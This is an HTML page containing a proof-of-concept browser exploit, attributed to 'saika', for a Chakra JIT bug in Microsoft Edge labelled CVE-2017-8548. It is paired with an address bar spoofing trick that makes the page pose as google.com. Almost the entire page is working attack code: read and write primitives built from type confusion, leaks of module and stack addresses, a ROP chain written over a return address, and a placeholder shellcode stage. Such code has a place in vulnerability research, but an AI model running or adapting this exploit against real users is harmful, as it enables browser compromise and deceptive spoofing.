<!DOCTYPE html>
<META http-equiv="Expires" content="-1"> 
<META http-equiv="Pragma" content="no-cache"> 
<META http-equiv="Cache-Control" content="No-Cache"> 
<script src='./long.min.js'></script>
<script src='./bignumber.min.js'></script>
<script>
window.onunload = function()
{
   document.execCommand("stop");
   document.write('<script> document.title="google.com :)" </\script>');
   document.write('<h1>Trust me, we are on google!</h1><h3>CVE-2017-8548 MSRC-39160 + something more</h3><div id="log"></div>');
   pwn();
}
function pwn(){
    let Long = dcodeIO.Long;

    function control(addr){
        function func(a, b, c) {
            a[0] = 1.2; //JIT assume a[0] is float but we change to var array with ValueOf helperCall
            b[0] = c;   //check failure and bypass bailout
            //a[1] = 2.2;
            a[0] = addr;
        }

        var a = [1.1, 2.2]; //lead boundery check failure in JIT
        var b = new Uint32Array(0);

        for (var i = 0; i < 0x10000; i++)
            func(a, b, i);

        func(a, b, {valueOf: () => {
            a[0] = fake;
            return 0;
        }});

        vector = a[0];
    }

    function leak(a, ta){
        function func(a, b, c) {
            a[0] = 1.2;
            b[0] = c;
            let [hi, lo] = [a[1],a[0]]; //leak fake object
            return [hi, lo];
        }

        var b = new Uint32Array(0);

        for (var i = 0; i < 0x10000; i++)
            func(a, b, i);

        let [hi, lo] = func(a, b, {valueOf: () => {
            a[0] = ta;
            return 0;
        }});

        return readfloatToint(lo);
    }

    function setFakeObj(hi, lo){
        /*
        DataView Structure
        vtable type* 0 0 buflen isDetached buf*
        */
        // vtable
        fake[1] = 0;
        fake[0] = 0x38;
        // type*
        fake[3] = hi;
        fake[2] = lo;
        // 0
        fake[5] = 0;
        fake[4] = 0;
        // 0
        fake[7] = 0;
        fake[6] = 0;
        // length
        fake[9] = 0;
        fake[8] = 0x3137;
        // isDetached
        fake[11] = hi;
        fake[10] = (lo - 0x58 + 0x30)|0;
        // buf*
        fake[15] = hi;
        fake[14] = lo;
    }

    let fake = new Array(0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0);
    let fdv = new DataView(new ArrayBuffer(8));

    plog('############ STAGE 1 ############')
    var a = [1.1, 2.2];
    let fakeaddr = Long.fromNumber(leak(a, fake),true); //leak fake arr ptr
    plog('[+] fake : 0x' + fakeaddr.toString(16));
    
    let [hi, lo] = [fakeaddr.getHighBitsUnsigned(), (fakeaddr.getLowBitsUnsigned()+0x58)|0]; //point fake dataview directly in fake arr
    setFakeObj(hi,lo);
    let vector;
    let addr = toDouble(p64(hi,lo));
    control(addr); // get power

    let vtable = Read64(p64(hi,lo-0x58));
    plog('[+] vtable : 0x'+vtable.toString(16)); 
    
    let chakra = vtable.sub(0x5938d8); //0x5938d8 0x274c40
    let chakralimit = chakra.add(8175616);

    plog('[+] chakra : 0x'+chakra.toString(16));
    plog('[+] chakralimit : 0x'+chakralimit.toString(16));
    
    let threadContext = Read64(chakra.add(0x735ea8)); //chakra!ThreadContext::globalListLast 
    let stacklimit = Read64(Read64(threadContext.add(0x390)));
    let stackbase = stacklimit.sub(0xc000).add(10*1024*1024); //get stackbase from limit

    plog('[+] stack range : 0x' + stacklimit.toString(16) + ' ~ ' + stackbase.toString(16));

    let target = chakra.add(0x1ab8b6);
    //let target2 = chakra.add(0x13d873);
    //chakra!Js::JavascriptFunction::CallRootFunction+0x4a 0x1ab8b6 chakra!MemProtectHeapRootAlloc+0xbb
    plog('[+] chakra!Js::JavascriptFunction::CallRootFunction+0x4a : 0x'+target.toString(16));
    let ret;
    var stackaddr;
    let tl = [];
    for (var i = 8; i < 32 * 1024; i += 8){
        stackaddr = stackbase.sub(i);
        var val = Read64(stackaddr);

        if (chakralimit > val && chakra < val){
            // plog('Found ' + val.toString(16));
            tl.push(stackaddr);
        }
        if (val.equals(target)){
            ret = stackaddr;
            break;
        }
    }
    plog('[*] Found retn : ' + tl.length);
    if (ret == undefined){
        if( 0 < tl.length ){
            plog('[!] get target addr failed but try overwrite all of chakra returns')
            for (var i = 0; i < tl.length; ++i ){
                ret = tl[i];
                Write64(ret,new Long(0x14141414,0x00000414,true));  
            }             
        }else{
            plog('<h3>[!] get return addr failed.</h3>');
            return false;
        }
    }
    plog('[*] Matched. CallRootFunction in 0x' + ret.toString(16));

    plog('############ STAGE 2 ############')

    var sc = unescape("%ucccc%ucccc%ucccc%ucccc%ucccc%ucccc");
    
    var b = [1.1, 2.2];
    let scaddr = Read64(Long.fromNumber(leak(b,sc),true).add(0x20));
    plog('[+] shellcode : 0x' + scaddr.toString(16));

    let zero = p64(0,0);
    let pppr = chakra.add(0x6DC3); // pop rdi ; pop rsi ; pop rbx ; ret
    let HeapPageAllocator = chakra.add(0x1DA2CB); // Memory::HeapPageAllocator
    plog('[+] pppr : 0x' + pppr.toString(16));
    plog('[+] Memory::HeapPageAllocator : 0x' + HeapPageAllocator.toString(16));
    let gadget = [
        pppr,
        scaddr,
        p64(0,0x3137),
        p64(0,0x10),
        HeapPageAllocator,
        zero,zero,zero,zero,zero,zero,
        zero,
        zero,zero,zero,zero,zero,zero,
        zero,zero,zero,zero,zero,zero,
        scaddr
    ]
    //Write64(ret,new Long(0x14141414,0x00000414,true));  
    
    for (var i = 0; i < gadget.length; ++i){
        //plog('write gadget')
        Write64(ret.add(i * 8), gadget[i]);
    }
    plog('[!] overwrite stack complete')
    alert('pwned');
    

    /* My Utils */
    function abs(num){
        return Math.abs(num);
    }

    function d2h(num){
        if (num < 0) num = 0xffffffff + num + 1;
        return num.toString(16);
    }

    function plog(str) {
        //var o = document.getElementById("log");
        //o.innerHTML += str + "<br>";
    }

    function p64(hi, lo){
        return new Long(lo,hi,true);
    }

    /* Utility for handle bignumber */
    function Int2Array(val) {
        var res = [];
        var hexed = ('0000000000000000' + val.toString(16)).substr(-16);
        for (var i = 0; i < 16; i+=2)
            res.push(parseInt(hexed.substr(i,2), 16));
        return res;
    };

    function toDouble(val) {
        var buffer = new ArrayBuffer(8);
        var byteView = new Uint8Array(buffer);
        var view = new Float64Array(buffer);

        byteView.set(Int2Array(val).reverse());
        return view[0];
    };

    function fromDouble(val) {
        var buffer = new ArrayBuffer(8);
        var view = new Float64Array(buffer);
        view[0] = val;
        return new Uint8Array(buffer, 0, view.BYTES_PER_ELEMENT);
    };

    function readfloatToint(arg){
        var res1 = "";
        var res2 = "";
        var bytes = fromDouble(arg);
        for (var i = 0; i < (bytes.length); i++){
          res1 += ("0"+ bytes[bytes.length - 1 - i].toString(16)).substr(-2);
        }
        return parseInt(res1, 16);
    }

    /* Utility by bpak */
    function SetAddress(addr)
    {
        fake[14] = addr.low|0;
        fake[15] = addr.high|0;
    }

    function Read64(addr)
    {
        SetAddress(addr);
        return new Long(fdv.getUint32.call(vector, 0, true), fdv.getUint32.call(vector, 4, true), true);
    }

    function Write64(addr, val)
    {
        SetAddress(addr);
        fdv.setUint32.call(vector, 0, val.low|0, true);
        fdv.setUint32.call(vector, 4, val.high|0, true);
    }
}
</script>
<body>
<h1>CVE-2017-8548 + Address bar Spoofing exploit by saika</h1>
<h3>try to move google.com on url!</h3>
</body>